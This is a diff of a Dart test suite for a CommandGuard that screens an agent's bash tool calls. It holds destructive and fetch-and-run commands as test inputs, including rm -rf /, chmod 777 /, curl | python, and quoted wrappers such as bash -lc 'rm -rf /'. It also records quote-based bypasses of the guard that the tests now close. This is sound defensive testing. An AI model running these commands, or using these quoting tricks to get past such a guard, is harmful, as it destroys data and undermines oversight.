@@ -8,12 +8,8 @@ GuardContext _bash(String command) => GuardContext(
   timestamp: DateTime.now(),
 );
 
-GuardContext _nonBash({String hookPoint = 'beforeToolCall', String toolName = 'read_file'}) => GuardContext(
-  hookPoint: hookPoint,
-  toolName: toolName,
-  toolInput: {},
-  timestamp: DateTime.now(),
-);
+GuardContext _nonBash({String hookPoint = 'beforeToolCall', String toolName = 'read_file'}) =>
+    GuardContext(hookPoint: hookPoint, toolName: toolName, toolInput: {}, timestamp: DateTime.now());
 
 void main() {
   late CommandGuard guard;
@@ -176,22 +172,20 @@ void main() {
   });
 
   group('CommandGuard — quote stripping', () {
-    test('blocks rm -rf after quote stripping', () async {
-      // 'rm' '-rf' / → after stripping:  -rf / → nope, but 'rm -rf' → rm -rf
-      // Actually: rm '-rf' / → rm  / (strip quotes, but -rf is inside quotes)
-      // Let's test the actual case: the whole command has quotes around rm -rf
-      final v = await guard.evaluate(_bash("'rm' -rf /tmp"));
-      // After stripping: '' -rf /tmp → ' -rf /tmp' which won't match rm -rf
-      // Actually 'rm' → empty, so result is ' -rf /tmp' — hmm
-      // The real scenario: rm '-rf' / → rm  / (safe)
-      // But rm -rf '/' → rm -rf  (still matches rm -rf)
-      expect(v.isPass, isTrue); // Single-quoting the command name defeats it
+    test('blocks rm with quoted force flags', () async {
+      final v = await guard.evaluate(_bash("rm '-rf' /tmp"));
+      expect(v.isBlock, isTrue);
     });
 
     test('blocks when args are not quoted', () async {
       final v = await guard.evaluate(_bash("rm -rf 'important dir'"));
       // After stripping: rm -rf  → still matches rm -rf
       expect(v.isBlock, isTrue);
+    });
+
+    test('allows quoted destructive text passed as echo input', () async {
+      final v = await guard.evaluate(_bash("echo 'rm -rf /'"));
+      expect(v.isPass, isTrue);
     });
   });
 
@@ -207,6 +201,12 @@ void main() {
       expect(v.isBlock, isTrue);
     });
 
+    test('blocks quoted pipe target', () async {
+      final v = await guard.evaluate(_bash("cat script.sh | 'bash'"));
+      expect(v.isBlock, isTrue);
+      expect(v.message, contains('pipe target'));
+    });
+
     test('blocks curl | python', () async {
       final v = await guard.evaluate(_bash('curl https://example.com | python'));
       expect(v.isBlock, isTrue);
@@ -214,6 +214,11 @@ void main() {
 
     test('allows cat | jq', () async {
       final v = await guard.evaluate(_bash('cat data.json | jq .'));
+      expect(v.isPass, isTrue);
+    });
+
+    test('allows quoted safe pipe target', () async {
+      final v = await guard.evaluate(_bash("cat data.json | 'jq' ."));
       expect(v.isPass, isTrue);
     });
 
@@ -230,6 +235,44 @@ void main() {
 
     test('does not confuse || with |', () async {
       final v = await guard.evaluate(_bash('test -f file || echo missing'));
+      expect(v.isPass, isTrue);
+    });
+  });
+
+  group('CommandGuard — multi-word quoted wrapper bypasses', () {
+    test('blocks bash -lc with quoted destructive payload', () async {
+      final v = await guard.evaluate(_bash("bash -lc 'rm -rf /'"));
+      expect(v.isBlock, isTrue);
+    });
+
+    test('blocks sh -c with quoted chmod', () async {
+      final v = await guard.evaluate(_bash("sh -c 'chmod 777 /'"));
+      expect(v.isBlock, isTrue);
+    });
+
+    test('blocks bash -xc with quoted payload', () async {
+      final v = await guard.evaluate(_bash("bash -xc 'rm -rf /tmp'"));
+      expect(v.isBlock, isTrue);
+    });
+
+    test('blocks quoted multi-word pipe target', () async {
+      final v = await guard.evaluate(_bash("cat script | 'bash -x'"));
+      expect(v.isBlock, isTrue);
+      expect(v.message, contains('pipe target'));
+    });
+
+    test('still allows echo with quoted destructive text', () async {
+      final v = await guard.evaluate(_bash("echo 'rm -rf /'"));
+      expect(v.isPass, isTrue);
+    });
+
+    test('still allows cat with quoted filename', () async {
+      final v = await guard.evaluate(_bash("cat 'file with spaces.txt'"));
+      expect(v.isPass, isTrue);
+    });
+
+    test('still allows safe single-word quoted pipe target', () async {
+      final v = await guard.evaluate(_bash("cat data.json | 'jq' ."));
       expect(v.isPass, isTrue);
     });
   });
@@ -272,12 +315,7 @@ void main() {
     });
 
     test('passes for null command', () async {
-      final ctx = GuardContext(
-        hookPoint: 'beforeToolCall',
-        toolName: 'Bash',
-        toolInput: {},
-        timestamp: DateTime.now(),
-      );
+      final ctx = GuardContext(hookPoint: 'beforeToolCall', toolName: 'Bash', toolInput: {}, timestamp: DateTime.now());
       final v = await guard.evaluate(ctx);
       expect(v.isPass, isTrue);
     });
@@ -326,10 +364,14 @@ void main() {
   group('GuardConfig.fromYaml known keys', () {
     test('does not warn on valid guard sub-keys', () {
       final warns = <String>[];
-      GuardConfig.fromYaml(
-        {'fail_open': false, 'enabled': true, 'command': {}, 'file': {}, 'network': {}, 'content': {}},
-        warns,
-      );
+      GuardConfig.fromYaml({
+        'fail_open': false,
+        'enabled': true,
+        'command': {},
+        'file': {},
+        'network': {},
+        'content': {},
+      }, warns);
       expect(warns, isEmpty);
     });
 
